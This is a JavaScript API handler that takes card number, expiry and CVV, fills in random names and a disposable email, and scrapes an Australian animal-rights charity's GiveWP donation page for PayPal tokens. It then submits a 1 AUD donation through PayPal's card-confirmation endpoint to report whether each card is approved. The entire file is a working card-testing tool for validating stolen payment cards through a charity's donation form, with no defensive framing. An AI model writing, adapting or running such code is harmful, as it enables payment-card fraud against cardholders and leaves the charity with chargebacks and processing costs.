const cookieJar = new Map();

// Helper for random strings
const randomString = (length) =>
    Array(length)
        .fill(0)
        .map(() => 'abcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random() * 26)])
        .join('');

// Public Email API (Mail.gw)
async function getPublicEmail() {
    try {
        const domainRes = await fetch('https://api.mail.gw/domains');
        const domainData = await domainRes.json();
        const domain = domainData['hydra:member'][0].domain;
        return `${randomString(10)}@${domain}`;
    } catch (e) {
        return `${randomString(10)}@outlook.com`;
    }
}

async function request(url, options = {}) {
    const headers = new Headers(options.headers || {});
    const cookieString = Array.from(cookieJar)
        .map(([key, value]) => `${key}=${value}`)
        .join('; ');

    if (cookieString) headers.set('cookie', cookieString);
    if (!headers.has('user-agent')) {
        headers.set('user-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36');
    }

    const response = await fetch(url, { ...options, headers });
    
    if (response.headers.getSetCookie) {
        response.headers.getSetCookie().forEach((cookie) => {
            const [name, value] = cookie.split(';')[0].split('=');
            if (name && value) cookieJar.set(name.trim(), value.trim());
        });
    }
    return response;
}

export default async function handler(req, res) {
    // Clear cookies for each new request to prevent session cross-talk
    cookieJar.clear();

    const { data: inputData } = req.query;
    if (!inputData) return res.status(400).json({ error: 'Usage: /api?data=number|mm|yy|cvv' });

    const [number, month, yearShort, cvv] = inputData.split('|');
    const email = await getPublicEmail();
    const user = { firstName: randomString(6), lastName: randomString(6), email };

    try {
        // 1. Get Form Data
        const html = await (await request('https://animalrights.org.au/donate-now/')).text();
        const formUrlMatch = html.match(/data-form-view-url='([^']+)'/);
        if (!formUrlMatch) throw new Error("Could not find form URL");
        
        const formUrl = formUrlMatch[1].replace(/&#038;/g, '&');
        const formText = await (await request(formUrl)).text();
        const exportedMatch = formText.match(/window\.givewpDonationFormExports\s*=\s*({[\s\S]*?});/);
        if (!exportedMatch) throw new Error("Could not find Form Exports");
        
        const data = JSON.parse(exportedMatch[1]);
        const settings = data.registeredGateways.find((g) => g.id === 'paypal-commerce')?.settings || data.registeredGateways[0].settings;

        // 2. Get PayPal Access Token
        const clientId = settings.sdkOptions.clientId;
        const auth = Buffer.from(`${clientId}:`).toString('base64');
        const tokenRes = await request('https://www.paypal.com/v1/oauth2/token', {
            method: 'POST',
            headers: {
                'Authorization': `Basic ${auth}`,
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: 'grant_type=client_credentials'
        });
        const tokenData = await tokenRes.json();
        const accessToken = tokenData.access_token;

        if (!accessToken) {
            return res.status(401).json({ error: "PayPal Auth Failed", details: tokenData });
        }

        // 3. Create Order
        const params = new URLSearchParams(new URL(data.donateUrl).search);
        const tokens = {
            formId: settings.donationFormId.toString(),
            formHash: settings.donationFormNonce,
            signature: params.get('givewp-route-signature'),
            signatureId: params.get('givewp-route-signature-id'),
            signatureExp: params.get('givewp-route-signature-expiration'),
        };

        const orderFormData = new FormData();
        Object.entries({
            action: 'give_paypal_commerce_create_order',
            'give-form-id': tokens.formId,
            'give-form-hash': tokens.formHash,
            give_payment_mode: 'paypal-commerce',
            'give-amount': '1',
            give_first: user.firstName,
            give_last: user.lastName,
            give_email: user.email,
            'give-cs-form-currency': 'AUD',
        }).forEach(([k, v]) => orderFormData.append(k, v));

        const orderRes = await (await request('https://animalrights.org.au/wp-admin/admin-ajax.php', {
            method: 'POST',
            body: orderFormData,
        })).json();
        
        const orderId = orderRes.data.id;

        // 4. Confirm Payment Source (Where the check happens)
        const confirmRes = await request(
            `https://www.paypal.com/v2/checkout/orders/${orderId}/confirm-payment-source`,
            {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${accessToken}`,
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    payment_source: {
                        card: {
                            number,
                            security_code: cvv,
                            expiry: `20${yearShort}-${month}`,
                        },
                    },
                }),
            }
        );

        const confirmData = await confirmRes.json();

        // 5. If Approved, Finalize on Site
        if (confirmData.status === 'APPROVED') {
            const finalParams = new URLSearchParams({
                'givewp-route': 'donate',
                'givewp-route-signature': tokens.signature,
                'givewp-route-signature-id': tokens.signatureId,
                'givewp-route-signature-expiration': tokens.signatureExp,
            });

            const finalForm = new FormData();
            Object.entries({
                amount: '1',
                currency: 'AUD',
                donationType: 'single',
                formId: tokens.formId,
                gatewayId: 'paypal-commerce',
                firstName: user.firstName,
                lastName: user.lastName,
                email: user.email,
                anonymous: 'false',
                isEmbed: 'true',
                embedId: 'give-form-shortcode-1',
                locale: 'en_AU',
                'gatewayData[payPalOrderId]': orderId,
                originUrl: 'https://animalrights.org.au/donate-now/',
            }).forEach(([k, v]) => finalForm.append(k, v));

            const finalResponse = await request(`https://animalrights.org.au/?${finalParams}`, {
                method: 'POST',
                body: finalForm,
                headers: { 'Accept': 'application/json' },
            });

            const finalText = await finalResponse.text();
            try {
                return res.status(200).json(JSON.parse(finalText));
            } catch {
                return res.status(200).send(finalText);
            }
        }

        // If not approved, send the PayPal error/status
        return res.status(200).json(confirmData);

    } catch (error) {
        return res.status(500).json({ error: error.message });
    }
}
